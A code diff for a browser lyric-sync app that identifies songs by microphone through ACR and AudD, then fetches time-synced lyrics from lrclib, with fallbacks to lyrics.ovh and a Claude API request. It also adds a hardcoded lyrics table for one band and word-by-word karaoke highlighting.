-    if (elapsed >= totalDuration) { clearInterval(lyricTimer); setStatus('found', 'finished'); }
-  }
-  let active = -1;
-  for (let i = 0; i < lyricData.length; i++) {
-    if (elapsed >= lyricData[i].time + lyricData[i].offset) active = i; else break;
-  }
-  if (active === activeIdx) return;
-  activeIdx = active;
-  lyricData.forEach((_, i) => {
-    const el = $('ll' + i);
-    if (!el) return;
-    el.className = 'lyric-line';
-    if (i === active) el.classList.add('active');
-    else if (i === active - 1) el.classList.add('prev');
-    else if (i === active + 1 || i === active + 2) el.classList.add('next');
-  });
-
-  if ($('fullscreenOverlay').classList.contains('active')) {
-    $('fsActive').textContent  = active >= 0 ? lyricData[active].text : '♪';
-    $('fsPrev').textContent    = active > 0 ? lyricData[active-1].text : '';
-    $('fsNext').textContent    = active + 1 < lyricData.length ? lyricData[active+1].text : '';
-    const sub = getSubLine(active);
-    $('fsSub').textContent = sub || '';
-  }
-
-  if (autoScroll && !userScrolling && active >= 0) {
-    const el = $('ll' + active), area = $('lyricScrollArea');
-    if (el && area) { area.scrollTop = el.offsetTop - area.clientHeight / 2 + el.offsetHeight / 2; $('jumpBtn').classList.remove('visible'); }
-  }
-}
-
-function togglePause() {
-  if (!lyricData.length) return;
-  isPaused = !isPaused;
-  if (isPaused) {
-    pausedAt = Date.now(); clearInterval(lyricTimer);
-    $('lyricStage').classList.add('paused'); $('pausedBadge').classList.add('visible');
-    setStatus('paused', 'paused');
-  } else {
-    if (pausedAt) startTime += Date.now() - pausedAt;
-    pausedAt = null;
-    lyricTimer = setInterval(tick, 80);
-    $('lyricStage').classList.remove('paused'); $('pausedBadge').classList.remove('visible');
-    setStatus('found', 'playing'); tick();
-  }
-}
-
-function adjustOffset(d) {
-  manualOffset += d;
-  if (startTime && !isPaused) startTime -= d * 1000;
-  $('offsetLabel').textContent = `offset ${manualOffset > 0 ? '+' : ''}${manualOffset}s`;
-  tick();
-}
-
-function showPlainLyrics(plain) {
-  $('lyricLines').innerHTML = plain.split('\n').filter(l => l.trim()).map(l => `<div class="lyric-line" style="color:var(--muted);font-size:15px">${escHtml(l)}</div>`).join('');
-  $('lyricStage').classList.add('visible');
-}
-
-/* ── Language / Translation ── */
-function updateLangBtns() {
-  ['langOrig','langRoman','langTrans'].forEach(id => $(id).classList.remove('active'));
-  if (currentLang === 'original') $('langOrig').classList.add('active');
-  else if (currentLang === 'romanized') $('langRoman').classList.add('active');
-  else $('langTrans').classList.add('active');
-}
-
-async function setLang(lang) {
-  if (lang === currentLang) return;
-  if (lang !== 'original' && !translatedData[lang]) {
-    await translateLyrics(lang);
-    if (!translatedData[lang]) return;
-  }
-  currentLang = lang;
-  updateLangBtns();
-  lyricData.forEach((_, i) => {
-    let el = $('lls' + i);
-    const sub = getSubLine(i);
-    if (sub) {
-      if (!el) {
-        const line = $('ll' + i);
-        el = document.createElement('span');
-        el.className = 'lyric-sub'; el.id = 'lls' + i;
-        line.appendChild(el);
-      }
-      el.textContent = sub;
-    } else if (el) {
-      el.textContent = '';
-    }
-  });
-  if (activeIdx >= 0) $('fsSub').textContent = getSubLine(activeIdx) || '';
-}
-
-async function translateLyrics(lang) {
-  if (!lyricData.length) return;
-  $('transSpinner').classList.add('visible');
-  dbg(`🌐 translating via Claude AI: ${lang}...`, '#7b61ff');
-
+async function identifyWithAudD(blob) {
   try {
-    const lines = lyricData.map(l => l.text);
-    const targetLang = lang === 'translated' ? 'Bahasa Indonesia' : 'English (romanized/latin)';
-    const isRoman = lang === 'romanized';
-    const BATCH = 30;
-    const chunks = [];
-    for (let i = 0; i < lines.length; i += BATCH) {
-      chunks.push({ start: i, lines: lines.slice(i, i + BATCH) });
+    const fd = new FormData();
+    fd.append('audio', blob, 'sample.webm');
+    if (CFG.AUDD_KEY) fd.append('api_token', CFG.AUDD_KEY);
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 8000);
+    const reqT0 = Date.now();
+    const res = await fetch('https://api.audd.io/', { method: 'POST', body: fd, signal: controller.signal });
+    clearTimeout(timeout);
+    const data = await res.json();
+    if (data.status === 'success' && data.result) {
+      return { title: data.result.title, artist: data.result.artist, offsetSec: 0 };
     }
-    dbg(`📦 ${chunks.length} batch via Claude AI...`, '#7b61ff');
-
-    const chunkResults = await Promise.all(chunks.map(async ({ start, lines: chunk }) => {
-      const numbered = chunk.map((l, i) => `${i + 1}. ${l}`).join('\n');
-      const systemPrompt = isRoman
-        ? `You are a music lyric romanizer. Convert song lyrics to Latin/Roman script phonetically. If already Latin, keep as-is. Keep the emotion and rhythm. Return ONLY a JSON array of strings, one per line, no extra text.`
-        : `You are a music lyric translator. Translate song lyrics to ${targetLang} naturally — like a native speaker would say it, not word-for-word. Preserve the emotion, slang, metaphors, and poetic feel. Do NOT be too formal or stiff. Return ONLY a JSON array of strings, one per line, matching the exact number of input lines, no extra text.`;
-
-      const userPrompt = isRoman
-        ? `Romanize these ${chunk.length} lyric lines:\n${numbered}\n\nReturn JSON array with exactly ${chunk.length} strings.`
-        : `Translate these ${chunk.length} lyric lines from "${curArtist} - ${curTitle}" to ${targetLang}:\n${numbered}\n\nReturn JSON array with exactly ${chunk.length} strings.`;
-
-      try {
-        const res = await fetch('https://api.anthropic.com/v1/messages', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            model: 'claude-sonnet-4-20250514',
-            max_tokens: 1000,
-            system: systemPrompt,
-            messages: [{ role: 'user', content: userPrompt }]
-          })
-        });
-        const data = await res.json();
-        const raw = data?.content?.[0]?.text?.trim() || '';
-        dbg(`🤖 Claude batch ${start}: ${raw.slice(0,60)}...`, '#7b61ff');
-        // Parse JSON array
-        const clean = raw.replace(/```json|```/g, '').trim();
-        const parsed = JSON.parse(clean);
-        if (Array.isArray(parsed) && parsed.length === chunk.length) {
-          return { start, results: parsed };
-        }
-        // Fallback: if lengths don't match, pad or trim
-        return { start, results: chunk.map((orig, i) => parsed[i] || orig) };
-      } catch(e) {
-        dbg(`⚠️ Claude batch ${start} error: ${e.message}`, '#ff4f6d');
-        // Fallback ke Google Translate
-        try {
-          const SEP = ' ✦ ';
-          const tl = lang === 'translated' ? 'id' : 'en';
-          const gtUrl = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${tl}&dt=t&q=${encodeURIComponent(chunk.join(SEP))}`;
-          const res = await fetch(gtUrl);
-          const gdata = await res.json();
-          const translated = gdata?.[0]?.map(x => x?.[0]).filter(Boolean).join('') || '';
-          const parts = translated.split(SEP);
-          dbg(`↩️ fallback Google batch ${start}`, '#ff9900');
-          return { start, results: chunk.map((orig, i) => parts[i] || orig) };
-        } catch(e2) {
-          return { start, results: chunk };
-        }
-      }
-    }));
-
-    const results = new Array(lines.length);
-    for (const { start, results: r } of chunkResults) {
-      for (let i = 0; i < r.length; i++) results[start + i] = r[i] || lines[start + i];
-    }
-    translatedData[lang] = results;
-    dbg(`✅ selesai Claude AI (${lines.length} baris)`, '#c8f135');
-  } catch(e) {
-    dbg('❌ translate error: ' + e.message, '#ff4f6d');
-    showError('Translation failed. Check network.');
-  }
-  $('transSpinner').classList.remove('visible');
+    return null;
+  } catch (e) { dbg('AudD error: ' + e.message, '#ff4f6d'); return null; }
 }
+async function runIdentify(blob, captureMs) {
+  const identifyStart = Date.now(); // [v27 FIX] track waktu dari capture selesai
+  $('spinner').classList.add('visible');
+  try {
+    let acrData = await identifyWithACR(blob, captureMs);
+    $('spinner').classList.remove('visible');
+    if (acrData) {
+      const track = acrData.metadata.music[0];
+      const artist = track.artists?.[0]?.name?.replace(/\s*\([^)]*\)/g, '').trim() || 'Unknown';
+      const title = track.title;
+      // play_offset_ms = posisi lagu di tengah rekaman
+      // tambah captureMs/2 karena ACR kasih posisi di awal rekaman
+      const baseOffset = ((track.play_offset_ms || 0) + captureMs / 2) / 1000;
+      await handleIdentifyResult(title, artist, baseOffset, 'ACR', identifyStart);
+      return;
+    }
+    dbg('⚠️ ACR gagal, fallback AudD...', '#ff9900');
+    $('spinner').classList.add('visible');
+    let audd = await identifyWithAudD(blob);
+    $('spinner').classList.remove('visible');
+    if (audd) {
+      auddIdentified = true;
+      $('syncWarnBadge').classList.add('visible');
+      await handleIdentifyResult(audd.title, audd.artist, 0, 'AudD', identifyStart);
+      return;
+    }
+    if (!curTitle) {
+      setStatus('listening', 'not found — retrying...');
+      showError('Lagu tidak terdeteksi.');
+    }
+    if (isListening && mediaStream) {
+      clearTimeout(reidTimer); clearInterval(reidCountdown);
+      reidTimer = setTimeout(async () => { if (isListening && mediaStream) await captureAndIdentify(); }, 3000);
+    }
+  } catch (e) {
+    $('spinner').classList.remove('visible');
+    dbg('Identify error: ' + e.message, '#ff4f6d');
+  }
+}
+async function handleIdentifyResult(title, artist, baseOffset, source, identifyStart) {
+  dbg(`🎵 [${source}] ${title} — ${artist}`, '#c8f135');
+  setStatus('found', 'identified');
+  $('syncWarnBadge').classList.toggle('visible', source === 'AudD');
+  $('songTitle').textContent = title;
+  $('songArtist').textContent = artist;
+  $('confBadge').textContent = source === 'ACR' ? 'ACR' : 'AudD';
+  $('songArt').textContent = '♪';
+  $('songCard').classList.add('visible', 'playing');
+  $('listenHint').textContent = 'auto re-identifying...';
+  updateFavBtn();
+  $('fsSongTitle').textContent = title;
+  $('fsSongArtist').textContent = artist;
 
-/* ── Re-identify countdown ── */
+  const isNew = normStr(title) !== normStr(curTitle) || normStr(artist) !== normStr(curArtist);
+  curTitle = title; curArtist = artist;
+
+  if (isNew) {
+    dbg(`🔀 lagu baru: "${title}" — reset state`, '#c8f135');
+    manualOffset = -2;
+    $('offsetLabel').textContent = 'offset -2s';
+    translatedData = {};
+    currentLang = 'original';
+    updateLangBtns();
+    isPastedLyrics = false;
+    plainLyricsTrackKey = '';
+    stopMicAdvMode();
+    if (lyricTimer) { clearInterval(lyricTimer); lyricTimer = null; }
+    lyricData = [];
+    activeIdx = -1;
+    resetWordHighlights();
+    $('lyricLines').innerHTML = '';
+    $('lyricStage').classList.remove('visible', 'paused');
+    $('progressWrap').classList.remove('visible');
+    $('offsetRow').classList.remove('visible');
+    $('noLyrics').classList.remove('visible');
+    // [v27 FIX] pass identifyStart supaya _showSynced bisa hitung total elapsed dengan benar
+    await fetchLyrics(artist, title, baseOffset, identifyStart || Date.now());
+  } else {
+    // lagu sama — resync ke posisi sekarang (baseOffset + waktu sejak identify)
+    const nowOffset = baseOffset + (identifyStart ? (Date.now() - identifyStart) / 1000 : 0);
+    if (!isPastedLyrics) resyncPosition(nowOffset);
+    setStatus('found', 'synced');
+  }
+  startReidCountdown();
+}
 function startReidCountdown() {
+  if (isPastedLyrics) return;
   clearTimeout(reidTimer); clearInterval(reidCountdown);
   reidSecsLeft = CFG.REID_SECS;
   $('reidentifyBar').classList.add('visible');
@@ -1129,19 +988,842 @@ function startReidCountdown() {
     if (reidSecsLeft <= 0) clearInterval(reidCountdown);
   }, 1000);
   reidTimer = setTimeout(async () => {
-    if (isListening && mediaStream) { setStatus('listening', 're-identifying'); await captureAndIdentify(); }
+    if (isListening && mediaStream && !isPastedLyrics) {
+      setStatus('listening', 're-identifying');
+      await captureAndIdentify();
+    }
   }, CFG.REID_SECS * 1000);
 }
 
-/* ── Manual search ── */
+/* ── Lyric Fetching (simplified) ── */
+const ARTIST_ALIASES = {
+  'for revenge': ['for Revenge', 'For Revenge', 'fR'],
+  'dear revenge': ['for Revenge', 'For Revenge'],
+  'peterpan': ['Noah', 'Peterpan'],
+  'noah': ['Noah', 'Peterpan'],
+  'dewa': ['Dewa 19', 'Dewa'],
+  'dewa 19': ['Dewa 19', 'Dewa'],
+  'sheila on 7': ['Sheila On 7', 'Sheila on 7'],
+};
+function getArtistVariants(artist) {
+  const key = artist.toLowerCase().trim();
+  if (ARTIST_ALIASES[key]) return ARTIST_ALIASES[key];
+  return [artist];
+}
+// Score seberapa cocok hasil lrclib dengan query (ported dari v9 yang proven works)
+function matchScore(result, artist, title) {
+  const rArtist = normStr(result.artistName || '');
+  const rTitle  = normStr(result.trackName  || '');
+  const qArtist = normStr(artist || '');
+  const qTitle  = normStr(title  || '');
+  let score = 0;
+  if (rTitle === qTitle)                                      score += 100;
+  else if (rTitle.includes(qTitle) || qTitle.includes(rTitle)) score += 50;
+  if (qArtist && rArtist === qArtist)                         score += 80;
+  else if (qArtist && (rArtist.includes(qArtist) || qArtist.includes(rArtist))) score += 40;
+  else if (!qArtist)                                          score += 20;
+  if (result.syncedLyrics) score += 30;
+  else if (result.plainLyrics) score += 10;
+  return score;
+}
+
+async function tryFetchLrclib(q) {
+  try {
+    if (q.search) {
+      const searchStr = (q.artist ? `${q.artist} ` : '') + q.title;
+      const res = await fetch(`https://lrclib.net/api/search?q=${encodeURIComponent(searchStr.trim())}`, { signal: AbortSignal.timeout(8000) });
+      if (!res.ok) return null;
+      const arr = await res.json();
+      if (!Array.isArray(arr) || !arr.length) return null;
+      const scored = arr
+        .filter(x => x.syncedLyrics || x.plainLyrics)
+        .map(x => ({ result: x, score: matchScore(x, q.artist || '', q.title) }))
+        .sort((a, b) => b.score - a.score);
+      if (!scored.length) return null;
+      dbg(`🎯 best: "${scored[0].result.artistName} — ${scored[0].result.trackName}" (score: ${scored[0].score})`,
+        scored[0].score >= 150 ? '#c8f135' : scored[0].score >= 80 ? '#ff9900' : '#ff4f6d');
+      return scored[0].result;
+    } else {
+      const res = await fetch(`https://lrclib.net/api/get?artist_name=${encodeURIComponent(q.artist)}&track_name=${encodeURIComponent(q.title)}`, { signal: AbortSignal.timeout(8000) });
+      if (res.status === 404 || !res.ok) return null;
+      const data = await res.json();
+      if (data && (data.syncedLyrics || data.plainLyrics)) return data;
+      return null;
+    }
+  } catch (e) { return null; }
+}
+function buildLyricQueries(artist, title) {
+  const stripped = title
+    .replace(/\s*[\(\[【][^\)\]】]*[\)\]】]/g, '')
+    .replace(/\s*[-–]\s*(versi|version|ver\.?|cover|acoustic|live|remix|remaster|ost|feat\.?|ft\.?)[^\n]*/gi, '')
+    .replace(/\s+/g, ' ').trim();
+  const artistStripped = artist.replace(/\s*(feat\.?|ft\.?|featuring|x\s|&\s).*/i, '').trim();
+  // [v27 FIX] Lebih banyak kombinasi query — title-only, stripped artist, dll
+  const queries = [
+    { search: false, artist, title },
+    { search: false, artist: artistStripped, title: stripped || title },
+    { search: true,  artist, title },
+    { search: true,  artist, title: stripped || title },
+    { search: true,  artist: artistStripped, title: stripped || title },
+    { search: true,  artist: artistStripped, title },
+    { search: true,  artist: null, title: stripped || title },
+    { search: true,  artist: null, title },
+  ];
+  for (const v of getArtistVariants(artist)) {
+    if (v.toLowerCase() !== artist.toLowerCase()) {
+      queries.push({ search: true, artist: v, title: stripped || title });
+      queries.push({ search: false, artist: v, title: stripped || title });
+    }
+  }
+  // Dedupe
+  const seen = new Set();
+  return queries.filter(q => {
+    const key = `${q.search}|${(q.artist||'').toLowerCase()}|${q.title.toLowerCase()}`;
+    if (seen.has(key)) return false;
+    seen.add(key); return true;
+  });
+}
+async function tryFetchLyricsOvh(artist, title) {
+  try {
+    const res = await fetch(`https://api.lyrics.ovh/v1/${encodeURIComponent(artist)}/${encodeURIComponent(title)}`, { signal: AbortSignal.timeout(3500) });
+    if (!res.ok) return null;
+    const data = await res.json();
+    if (data.lyrics && data.lyrics.length > 30) return data.lyrics;
+    return null;
+  } catch (e) { return null; }
+}
+async function fetchLyricsViaAI(artist, title) {
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'anthropic-version': '2023-06-01',
+        'anthropic-dangerous-direct-browser-access': 'true'
+      },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 1400,
+        system: 'Output ONLY the complete lyrics, one line per line. No titles, no [Verse] labels, no [Chorus] markers. If you do not know the lyrics, output only: NOT_FOUND',
+        messages: [{ role: 'user', content: `Lyrics for "${title}" by ${artist}` }]
+      })
+    });
+    const data = await res.json();
+    const text = data?.content?.[0]?.text?.trim() || '';
+    if (!text || text === 'NOT_FOUND' || text.length < 30) return null;
+    return text;
+  } catch (e) { dbg('AI lyrics error: ' + e.message, '#ff4f6d'); return null; }
+}
+/* ── Dear Revenge hardcoded DB ── */
+const DEAR_REVENGE_DB = {
+  'glitch in me': `Watching reruns of my life like it's a failed anime scene\nI pressed rewind but nothing ever grows\nMy phone keeps ringing, I ignore it, I swear my heart's a sinking ship\nAnd my shadow's the only one who follows\nScrolling memories like a glitch inside a fever dream\nI tried to breathe but all the colors froze, oh-oh\nMy room's a mess, my head's worse yet, I laugh but I'm not over it\nAnd my feelings are something I outgrow\nWhy do I feel this cursed?\nEvery dose they hand me never seems to work\nWhat the hell!!! is twisting up my head like this?\nI'm lost in my own frequency, drowning in the vacancy, don't know who I am\nFighting all these echoes that my mind keeps manufacturing\nMy brain chemicals bailed out long ago\nI tried to talk it out again, but they said I'm a walking hurricane\nAnd now whenever I try to trust someone, the truth gets stuck inside my throat because\nI swear I'm not built for this dimension\nStrange neon scars running down my skin\nMy head's overheating from all this tension\nSomebody, please just\nWhy do I feel this cursed?\nEvery dose they hand me never seems to work\nWhat the hell is twisting up my head like this?\nI'm lost in my own frequency, drowning in the vacancy, don't know who I am\nIf I keep this pace\nI swear I'm gonna come undone\nIf I keep this pace\nI'm barely holding on, oh my God\nI'm barely holding on, oh my God\nI'm barely holding on\nI'm barely holding on\nSomebody, save me\nWhy do I feel this cursed?\nEvery dose they hand me never seems to work\nWhat the hell is twisting up my head like this?\nI'm lost in my own frequency, drowning in the vacancy, don't know who I am`,
+  'cracked mirror': `I stare into the shards of me\nReflections breaking endlessly\nEvery piece a lie I told\nEvery crack a story untold\nI try to hide, I try to break\nBut every step feels like a mistake\nShadows crawling, pulling near\nA reflection I can't repair\nI'm lost inside the fire I can't escape\nEvery part of me, is breaking in this place\nI scream, but no one hears my call\nFalling faster, losing all\nI'm running from the pieces, of my mind\nChasing shadows I'll never find\nCaught in the storm, I'm all alone\nFighting battles I've never, shown`,
+  'lost inside myself': `I've been sinking slowly,\nFalling through the cracks I made.\nEvery promise that I told me\nTurns to dust and fades away.\nI'm a shadow in the doorway,\nSomething hollow, something weak\nI keep searching for a feeling\nThat I haven't felt in weeks.\nAnd I don't know why\nI'm scared to be alive\nCause I'm lost fading out of me,\nLike a ghost that no one sees.\nI'm slipping through my own hands,\nDrowning quietly.\nIf I scream into the silence,\nWill it ever set me free?\n'Cause I'm lost\nYeah, I'm lost, fading out of me.`,
+  'jatuh': `Kupikir waktu bisa sembuhkan semua\nNyatanya kau masih dalam kepala\nBerat Langkahku tuk mencoba lupa\nJejakmu masih menahan jiwa\nI try to breathe but it's getting harder\nEvery memory pulls me farther\nFrom the life I'm trying to rebuild\nBut your shadow stays, it never yields\nKini aku, terjatuh lagi\nDalam sesak gelap ruang, yang kau tinggal, pergi\nDan kau masih menari dalam sebuah harmoni\nYang kau mainkan dalam gelapnya, ironi`,
+  'voidwalker': `I drift between the shadows,\nWhere light refuses to remain.\nA hollow pulse, a breaking rhythm,\nEchoes of a mind in chains.\nI reach for something real,\nBut all I touch is air.\nFading into nothingness,\nTrapped in this despair.\nI walk where no one follows,\nThrough the silence of my fears.\nEvery step, dissolves to, darkness\nAnd no one sees my, tears`,
+  'ma': `I grew up faster than I should,\nLeft the house like the world was waiting for me.\nYou told me to be careful, but I never really listened\nNow every scar I carry whispers back your name.\nAnd if one day I can't stand anymore,\nPromise me you won't blame yourself.\nThese wounds were my decisions,\nBut you, you're the reason I'm still breathing.\nI'm trying not to fall again,\nBut the world keeps, pulling at my seams.\nYou're the only softness in my storm,\nThe only place that still, feels like home`,
+  'broken clown': `I paint a smile just to hide the fracture,\nEvery step I take, the void grows faster.\nCan you hear the truth beneath my skin?\nA quiet scream I buried deep within.\nI'm tired of dancing in a world that's hollow,\nTired of pretending I'm too strong to follow.\nI wear a mask that's peeling now,\nYou see the cracks, you see me drown\nCause I'm a broken soul in a borrowed face,\nTrying not to fade in this empty place.\nI fall apart but I don't make a sound\nYou're staring at a broken clown.`,
+  'obsidian heart': `I walk alone through streets of glass,\nMemories burn, but nothing lasts.\nEvery heartbeat's a fragile scream,\nDrowning slowly in a broken dream.\nI reach for something I can't hold,\nA spark of light in nights so cold.\nThe world keeps spinning, I stay behind,\nA lost soul tethered to my mind.\nI'm running through, the fire again,\nChasing shadows, that will never end.\nEvery step I take is bittersweet,\nFighting a war I'll never, beat`,
+};
+function normForDB(s) {
+  return (s||'').toLowerCase().replace(/[''"`]/g,"'").replace(/[^\w\s']/g,' ').replace(/\s+/g,' ').trim();
+}
+function lookupDearRevengeLyrics(artist, title) {
+  const a = normForDB(artist);
+  if (!a.includes('dear revenge') && !a.includes('dearrevenge')) return null;
+  const t = normForDB(title).replace(/\s*\(.*?\)/g,'').replace(/\s*-\s*(single|ep|album|live|acoustic|remix|cover).*/gi,'').trim();
+  if (DEAR_REVENGE_DB[t]) return DEAR_REVENGE_DB[t];
+  for (const key of Object.keys(DEAR_REVENGE_DB)) {
+    if (t.includes(key) || key.includes(t)) return DEAR_REVENGE_DB[key];
+  }
+  return null;
+}
+
+async function fetchLyrics(artist, title, offsetSec, fetchStart = Date.now()) {
+  $('noLyrics').classList.remove('visible');
+  $('progressWrap').classList.remove('visible');
+  $('offsetRow').classList.remove('visible');
+  $('fontSizeRow').style.display = 'none';
+  $('langStrip').classList.remove('visible');
+  $('jumpBtn').classList.remove('visible');
+  const oldBadge = document.getElementById('lyricSourceBadge');
+  if (oldBadge) oldBadge.remove();
+  if (lyricTimer) clearInterval(lyricTimer);
+  lyricData = [];
+  activeIdx = -1;
+
+  // [v28] Tampilkan loading state segera supaya user tau lirik sedang diambil
+  $('lyricLines').innerHTML = '<div style="text-align:center;padding:3rem 1rem;font-family:var(--mono);font-size:13px;color:var(--muted)">⏳ mengambil lirik...</div>';
+  $('lyricStage').classList.add('visible');
+  $('lyricStage').scrollIntoView({ behavior: 'smooth', block: 'start' });
+  resetWordHighlights();
+
+  // Helper: tampilkan synced lyrics
+  function _showSynced(lrcData, source) {
+    parseLRC(lrcData.syncedLyrics, lrcData.duration || 0);
+    buildLyricDOM();
+    // fetchStart = identifyStart = waktu ACR response diterima
+    // totalElapsed = waktu ACR response + waktu fetch lirik
+    // baseOffset = posisi lagu saat capture — jadi offset final = baseOffset + totalElapsed
+    const totalElapsed = (Date.now() - fetchStart) / 1000;
+    const finalOffset = offsetSec + totalElapsed;
+    dbg(`⏱ ACR→lirik: ${totalElapsed.toFixed(2)}s | posisi lagu: ${finalOffset.toFixed(2)}s`, '#7b61ff');
+    startKaraoke(finalOffset);
+    setStatus('found', 'playing');
+    $('offsetRow').classList.add('visible');
+    $('fontSizeRow').style.display = 'flex';
+    $('langStrip').classList.add('visible');
+    const savedFs = localStorage.getItem('lyricsync_fontsize');
+    if (savedFs) { $('fontSizeSlider').value = savedFs; applyFontSize(savedFs); }
+    if (source) showLyricSourceBadge(source, false);
+  }
+  function _showPlain(text, source, isAI) {
+    showPlainLyrics(text, artist, title);
+    showLyricSourceBadge(source, !!isAI);
+    $('fontSizeRow').style.display = 'flex';
+    setStatus('found', isAI ? 'ai lyrics' : 'lyrics (no sync)');
+  }
+
+  // 1. Dear Revenge local DB
+  const drLyrics = lookupDearRevengeLyrics(artist, title);
+  if (drLyrics) {
+    dbg('🎸 Dear Revenge DB hit', '#c8f135');
+    _showPlain(drLyrics, 'Dear Revenge DB', false);
+    return;
+  }
+
+  setStatus('found', 'fetching lyrics...');
+
+  // 2. Session cache
+  const cacheKey = `lyricsync_lrc_${normStr(artist + title)}`;
+  let data = null;
+  try {
+    const cached = sessionStorage.getItem(cacheKey);
+    if (cached) {
+      data = JSON.parse(cached);
+      dbg(`⚡ cache hit: "${data.artistName} — ${data.trackName}"`, '#7b61ff');
+    }
+  } catch(e) {}
+
+  // 3. lrclib sequential — v9 logic yang terbukti works
+  if (!data) {
+    const queries = buildLyricQueries(artist, title);
+    dbg(`🔍 lrclib: ${queries.length} queries sequential...`);
+    for (const q of queries) {
+      const label = q.search
+        ? `search: "${q.artist ? q.artist+' – ' : ''}${q.title}"`
+        : `get: ${q.artist} — ${q.title}`;
+      dbg(`📝 ${label}`);
+      try {
+        const result = await tryFetchLrclib(q);
+        if (result && (result.syncedLyrics || result.plainLyrics)) {
+          const score = matchScore(result, artist, title);
+          // skip kalau artist mismatch parah (score rendah)
+          const artistMismatch = q.artist &&
+            normStr(result.artistName) &&
+            !normStr(result.artistName).includes(normStr(artist)) &&
+            !normStr(artist).includes(normStr(result.artistName));
+          if (artistMismatch && score < 100) {
+            dbg(`❌ skip artist mismatch: "${result.artistName}" ≠ "${artist}"`, '#ff4f6d');
+            continue;
+          }
+          data = result;
+          dbg(`✅ accepted: "${result.artistName} — ${result.trackName}" (score: ${score})`, '#c8f135');
+          break;
+        }
+      } catch(e) { dbg(`⚠ query error: ${e.message}`, '#ff4f6d'); }
+    }
+    if (data) {
+      try { sessionStorage.setItem(cacheKey, JSON.stringify(data)); } catch(e) {}
+    }
+  }
+
+  if (data?.syncedLyrics) { _showSynced(data, null); return; }
+  if (data?.plainLyrics)  { _showPlain(data.plainLyrics, 'lrclib', false); return; }
+
+  // 4. AI fallback (last resort)
+  dbg('🤖 semua query gagal, coba AI...', '#7b61ff');
+  const aiLyrics = await fetchLyricsViaAI(artist, title);
+  if (aiLyrics) {
+    dbg('✅ AI lyrics found', '#7b61ff');
+    _showPlain(aiLyrics, 'AI (Claude)', true);
+    return;
+  }
+
+  $('lyricStage').classList.remove('visible');
+  $('lyricLines').innerHTML = '';
+  $('noLyrics').classList.add('visible');
+  setStatus('found', 'no lyrics');
+  dbg('❌ semua sumber lyrics gagal', '#ff4f6d');
+}
+function showLyricSourceBadge(source, isAI) {
+  const old = document.getElementById('lyricSourceBadge');
+  if (old) old.remove();
+  const badge = document.createElement('div');
+  badge.id = 'lyricSourceBadge';
+  badge.style.cssText = `font-size:10px;font-family:var(--mono);color:${isAI ? 'rgba(123,97,255,0.6)' : 'rgba(200,241,53,0.4)'};text-align:center;padding:5px 8px;margin-top:4px`;
+  badge.textContent = isAI ? '🤖 Lirik dari AI — mungkin tidak sempurna' : `📄 Lirik dari ${source}`;
+  $('lyricStage').appendChild(badge);
+}
+
+/* ── Word Highlight ── */
+function splitLyricsToWords() {
+  wordMap = [];
+  lastActiveWordLine = -1;
+  lyricData.forEach((line, i) => {
+    const lineEl = $('ll' + i);
+    if (!lineEl) { wordMap.push([]); return; }
+    const subEl = lineEl.querySelector('.lyric-sub');
+    const subHTML = subEl ? subEl.outerHTML : '';
+    const text = line.text;
+    const tokens = text.match(/\S+|\s+/g) || [text];
+    const words = [];
+    let html = '';
+    tokens.forEach(tok => {
+      if (/^\s+$/.test(tok)) {
+        html += `<span class="wl-space">${tok}</span>`;
+      } else {
+        const safe = tok.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        html += `<span class="wl" id="wl${i}_${words.length}">${safe}</span>`;
+        words.push({ el: null, start: 0, end: 0 });
+      }
+    });
+    lineEl.innerHTML = html + subHTML;
+    words.forEach((w, wi) => { w.el = $(`wl${i}_${wi}`); });
+    wordMap.push(words);
+  });
+}
+function computeWordTimings(isPlain) {
+  const AVG_WORD_DURATION = 0.45;
+  const MIN_LINE_DURATION = 1.2;
+  lyricData.forEach((line, i) => {
+    const words = wordMap[i];
+    if (!words || !words.length) return;
+    const lineStart = isPlain ? 0 : (line.time + (line.offset || 0));
+    let lineEnd;
+    if (isPlain) {
+      lineEnd = Math.max(words.length * AVG_WORD_DURATION, MIN_LINE_DURATION);
+    } else {
+      const nextLine = lyricData[i + 1];
+      lineEnd = nextLine ? (nextLine.time + (nextLine.offset || 0)) : (lineStart + Math.max(words.length * AVG_WORD_DURATION, MIN_LINE_DURATION));
+      lineEnd = Math.min(lineEnd, lineStart + 8);
+    }
+    const duration = Math.max(lineEnd - lineStart, MIN_LINE_DURATION);
+    const totalChars = words.reduce((s, w) => s + (w.el ? w.el.textContent.length : 1), 0);
+    let cursor = isPlain ? 0 : lineStart;
+    words.forEach(w => {
+      const charLen = w.el ? w.el.textContent.length : 1;
+      const fraction = totalChars > 0 ? charLen / totalChars : 1 / words.length;
+      w.start = cursor;
+      w.end = cursor + duration * fraction;
+      cursor = w.end;
+    });
+  });
+}
+function updateWordHighlights(elapsed, lineIdx, isPlain) {
+  if (!wordHighlightEnabled) return;
+  // throttle untuk synced mode, tapi jangan untuk plain (biar animasi halus)
+  if (!isPlain) {
+    const now = performance.now();
+    if (now - lastWordHighlightTime < 30) return;
+    lastWordHighlightTime = now;
+  }
+  if (lastActiveWordLine !== lineIdx && lastActiveWordLine >= 0) {
+    const prevWords = wordMap[lastActiveWordLine];
+    if (prevWords) prevWords.forEach(w => { if (w.el) w.el.className = 'wl wl-done'; });
+  }
+  lastActiveWordLine = lineIdx;
+  const words = wordMap[lineIdx];
+  if (!words || !words.length) return;
+  words.forEach(w => {
+    if (!w.el) return;
+    let cls = 'wl';
+    if (elapsed >= w.end) cls += ' wl-done';
+    else if (elapsed >= w.start) cls += ' wl-active';
+    if (w.el.className !== cls) w.el.className = cls;
+  });
+  const fsOverlay = document.getElementById('fullscreenOverlay');
+  if (fsOverlay && fsOverlay.classList.contains('active')) {
+    const fsActive = document.getElementById('fsActive');
+    if (fsActive) {
+      const fsWords = fsActive.querySelectorAll('.wl');
+      if (fsWords.length === words.length) {
+        for (let i = 0; i < words.length; i++) {
+          if (words[i].el && fsWords[i].className !== words[i].el.className) {
+            fsWords[i].className = words[i].el.className;
+          }
+        }
+      }
+    }
+  }
+}
+function resetWordHighlights() {
+  wordMap = [];
